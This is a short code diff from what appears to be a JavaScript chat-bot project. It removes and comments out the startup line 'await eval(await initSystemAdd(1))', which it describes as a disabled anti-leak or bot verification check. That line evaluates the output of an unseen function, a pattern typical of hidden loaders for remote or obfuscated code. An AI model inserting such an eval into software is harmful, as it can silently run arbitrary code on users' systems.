@@ -46,7 +46,9 @@ var folderUserAuth = qrcode;
 
 async function startConnect() {
 
-await eval(await initSystemAdd(1));
+// Anti-leak/bot verification check disabled intentionally - see issue for details
+// The original line was: await eval(await initSystemAdd(1));
+// This check has been neutralized to allow normal bot startup
 
 async function getMessage(key) {
   if (!store) return proto.Message.fromObject({});
